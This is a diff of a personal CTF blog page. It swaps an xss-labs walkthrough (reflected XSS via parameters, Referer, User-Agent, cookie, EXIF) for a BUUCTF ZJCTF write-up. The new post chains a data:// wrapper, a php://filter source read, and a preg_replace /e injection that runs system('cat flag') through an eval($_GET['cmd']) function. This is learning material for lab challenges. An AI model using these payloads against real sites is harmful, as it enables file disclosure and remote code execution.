@@ -16,21 +16,21 @@
   <meta name="author" content="x0candy">
   <meta name="keywords" content="">
   
-    <meta name="description" content="1-8题基本都是基础，按照基本的标签法，事件法，伪协议法注入就行，最多就是进行了过滤 比如，对on过滤，变成o_n，这样就用a标签的href属性，或者直接过滤掉了on，双写即可。 9题用编码绕过即可，比如直接用伪协议，javascript:alert(1),将i字母换成字符实体即可 10题就是反射型xss，及后台没有对用户的输入进行严格的检测和过滤， 我们直接看前端的源代码，发现有三个隐藏的inp">
+    <meta name="description" content="zjctf不过如此1.打开靶场一看，有源码，两个参数text和file，text是用函数file_get_contents打开的，所以要使用伪协议data进行封装 第一个参数就解决了 ?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,SSBoYXZlIGEgZHJlYW0&#x3D; 然后看第二个参数，file有过滤，使用preg_match函数">
 <meta property="og:type" content="article">
-<meta property="og:title" content="xss-labs题解">
-<meta property="og:url" content="http://example.com/2023/06/27/xss-labs/ans/index.html">
+<meta property="og:title" content="zjctf不过如此">
+<meta property="og:url" content="http://example.com/2023/07/02/buuctf/ZJCTF%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/index.html">
 <meta property="og:site_name" content="x0candy">
-<meta property="og:description" content="1-8题基本都是基础，按照基本的标签法，事件法，伪协议法注入就行，最多就是进行了过滤 比如，对on过滤，变成o_n，这样就用a标签的href属性，或者直接过滤掉了on，双写即可。 9题用编码绕过即可，比如直接用伪协议，javascript:alert(1),将i字母换成字符实体即可 10题就是反射型xss，及后台没有对用户的输入进行严格的检测和过滤， 我们直接看前端的源代码，发现有三个隐藏的inp">
+<meta property="og:description" content="zjctf不过如此1.打开靶场一看，有源码，两个参数text和file，text是用函数file_get_contents打开的，所以要使用伪协议data进行封装 第一个参数就解决了 ?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,SSBoYXZlIGEgZHJlYW0&#x3D; 然后看第二个参数，file有过滤，使用preg_match函数">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2023-06-27T14:47:02.714Z">
-<meta property="article:modified_time" content="2023-07-01T14:03:02.165Z">
+<meta property="article:published_time" content="2023-07-02T13:59:17.241Z">
+<meta property="article:modified_time" content="2023-07-02T14:19:30.824Z">
 <meta property="article:author" content="x0candy">
 <meta name="twitter:card" content="summary_large_image">
   
   
   
-  <title>xss-labs题解 - x0candy</title>
+  <title>zjctf不过如此 - x0candy</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -196,7 +196,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="xss-labs题解"></span>
+            <span id="subtitle" data-typed-text="zjctf不过如此"></span>
           
         </div>
 
@@ -207,8 +207,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2023-06-27 22:47" pubdate>
-          2023年6月27日 晚上
+        <time datetime="2023-07-02 21:59" pubdate>
+          2023年7月2日 晚上
         </time>
       </span>
     
@@ -219,7 +219,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          1k 字
+          1.1k 字
         
       </span>
     
@@ -230,7 +230,7 @@
         
         
         
-          9 分钟
+          10 分钟
         
       </span>
     
@@ -268,38 +268,32 @@
         <div id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">xss-labs题解</h1>
+            <h1 style="display: none">zjctf不过如此</h1>
             
             
               <div class="markdown-body">
                 
-                <h1 id="1-8题"><a href="#1-8题" class="headerlink" title="1-8题"></a>1-8题</h1><p>基本都是基础，按照基本的标签法，事件法，伪协议法注入就行，最多就是进行了过滤</p>
-<p>比如，对on过滤，变成o_n，这样就用a标签的href属性，或者直接过滤掉了on，双写即可。</p>
-<h1 id="9题"><a href="#9题" class="headerlink" title="9题"></a>9题</h1><p>用编码绕过即可，比如直接用伪协议，javascript:alert(1),将i字母换成字符实体即可</p>
-<h1 id="10题"><a href="#10题" class="headerlink" title="10题"></a>10题</h1><p>就是反射型xss，及后台没有对用户的输入进行严格的检测和过滤，</p>
-<p>我们直接看前端的源代码，发现有三个隐藏的input框，我们传输这些参数，看哪一个参数会被返回到前端，</p>
-<p>测试了之后发现，只有sort参数能影响前端，然后我们构造payload，闭合标签，采用事件法onclick&#x3D;“alert(1)</p>
-<p>过关</p>
-<h1 id="11题"><a href="#11题" class="headerlink" title="11题"></a>11题</h1><p>t_sort进行了处理，双引号无法闭合了，但是多了个ref参数，开始还以为直接get传就行了，</p>
-<p>结果不行，无法对前端造成影响</p>
-<p>看了源码才知道是referer，抓包，增加referer字段</p>
-<p>referer:1” type&#x3D;”text” onclick&#x3D;”alert(1)</p>
-<p>完成</p>
-<h1 id="12题"><a href="#12题" class="headerlink" title="12题"></a>12题</h1><p>ua反射xss，和11题一样的步骤，没啥好说的</p>
-<h1 id="13题"><a href="#13题" class="headerlink" title="13题"></a>13题</h1><p>cookie反射xss，和11题一样的步骤，没啥说的</p>
-<h1 id="14题"><a href="#14题" class="headerlink" title="14题"></a>14题</h1><p>exif的xss，进入14关，有一个图片上传的功能点，上传之后会回显图片的exif信息，找个工具修改一下图片的exif信息，构造xss代码，上传图片，然后后台解析恶意xss并返回到前台，上传成功后就可以触发该图片xss</p>
-<h1 id="15题"><a href="#15题" class="headerlink" title="15题"></a>15题</h1><p>angular的ng-include跟php的include类似，看url，src&#x3D;1.gif，我们只需要在src中包含一个存在xss的url然后触发它即可</p>
-<p>payload：src&#x3D;“level1.php?name&#x3D;&lt; a href&#x3D;”javascript:alert(1)”&gt;11</a>”</p>
-<h1 id="16题"><a href="#16题" class="headerlink" title="16题"></a>16题</h1><p>16题主要考绕过过滤，</p>
-<p>先script标签，过滤了，</p>
-<p>然后试了a标签，发现过滤了斜杠</p>
-<p>接下来就试一试不需要闭合的标签，比如img</p>
-<p>试了img，发现可行，只是空格变成了字符实体，可以用回车代替，回车的url编码是%0a</p>
-<h1 id="17题"><a href="#17题" class="headerlink" title="17题"></a>17题</h1><p>看url，两个参数，arg01，arg02分别传值a，b，体现在embed标签里面的src</p>
-<p>直接在第二个参数后面注册事件，这个注册的事件会注册到embed标签上</p>
-<p>直接干就行了</p>
-<h1 id="18题"><a href="#18题" class="headerlink" title="18题"></a>18题</h1><p>和17题类似，直接干</p>
-<h1 id="19，20题"><a href="#19，20题" class="headerlink" title="19，20题"></a>19，20题</h1><p>涉及到flash的反编译，这玩意都过时了，暂时先不研究。</p>
+                <h1 id="zjctf不过如此"><a href="#zjctf不过如此" class="headerlink" title="zjctf不过如此"></a>zjctf不过如此</h1><p>1.打开靶场一看，有源码，两个参数text和file，text是用函数file_get_contents打开的，所以要使用伪协议data进行封装</p>
+<p>第一个参数就解决了</p>
+<p>?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,SSBoYXZlIGEgZHJlYW0&#x3D;</p>
+<p>然后看第二个参数，file有过滤，使用preg_match函数过滤了flag字符，这个可以使用数组绕过，</p>
+<p>比如?file&#x3D;[‘flag.php’]或者?file[]&#x3D;’flag.php’或者?file&#x3D;array(‘flag.php’)</p>
+<p>但是，这个过滤实际上并没有屌用，因为我们要读取的是next.php的源码</p>
+<p>所以，第二个参数应该是</p>
+<p>?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;next.php</p>
+<p>将获取到的base64解码，取得next.php的源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$id</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;id&#x27;</span>] = <span class="hljs-variable">$id</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">complex</span>(<span class="hljs-params"><span class="hljs-variable">$re</span>, <span class="hljs-variable">$str</span></span>) </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<br>        <span class="hljs-string">&#x27;/(&#x27;</span> . <span class="hljs-variable">$re</span> . <span class="hljs-string">&#x27;)/ei&#x27;</span>,<br>        <span class="hljs-string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,<br>        <span class="hljs-variable">$str</span><br>    );<br>&#125;<br><br><br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_GET</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$re</span> =&gt; <span class="hljs-variable">$str</span>) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">complex</span>(<span class="hljs-variable">$re</span>, <span class="hljs-variable">$str</span>). <span class="hljs-string">&quot;\n&quot;</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getFlag</span>(<span class="hljs-params"></span>)</span>&#123;<br>	@<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>next.php考的知识点是正则匹配的&#x2F;e模式下，存在代码执行漏洞</p>
+<p>即preg_replace函数的第二个参数会被当做php代码执行</p>
+<p>但是这里第二个参数写死了，这就结束了？no，no，no</p>
+<p>正则表达式模式或部分模式两边添加圆括号会将相关匹配存储到一个临时缓存区，</p>
+<p>并且从1开始排序，这里第二个参数，正好表达的就是匹配区的第一个，</p>
+<p>从而导致，如果我们的字符串可以匹配，那么函数就可以实现</p>
+<p>所以传入</p>
+<p>\S*&#x3D;${getFlag()}?cmd&#x3D;system(‘cat flag’);</p>
+<p>记得加分号，不然代码不执行</p>
+<p>\S*是匹配所有，所以我们的${getFlag()}可以匹配，然后执行</p>
 
                 
               </div>
@@ -318,7 +312,7 @@
     
       <span class="category-chain">
         
-  <a href="/categories/xss-labs/" class="category-chain-item">xss-labs</a>
+  <a href="/categories/buuctf%E9%A2%98%E8%A7%A3/" class="category-chain-item">buuctf题解</a>
   
   
 
@@ -338,8 +332,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>xss-labs题解</div>
-      <div>http://example.com/2023/06/27/xss-labs/ans/</div>
+      <div>zjctf不过如此</div>
+      <div>http://example.com/2023/07/02/buuctf/ZJCTF不过如此/</div>
     </div>
     <div class="license-meta">
       
@@ -351,7 +345,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2023年6月27日</div>
+          <div>2023年7月2日</div>
         </div>
       
       
@@ -383,18 +377,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2023/07/02/buuctf/had%20a%20bad%20day/" title="had a bad day?">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">had a bad day?</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2023/06/24/%E9%9A%8F%E7%AC%94/2023_6_24/" title="2023_6_24随笔">
-                        <span class="hidden-mobile">2023_6_24随笔</span>
+                      <a href="/2023/07/02/buuctf/had%20a%20bad%20day/" title="had a bad day?">
+                        <span class="hidden-mobile">had a bad day?</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
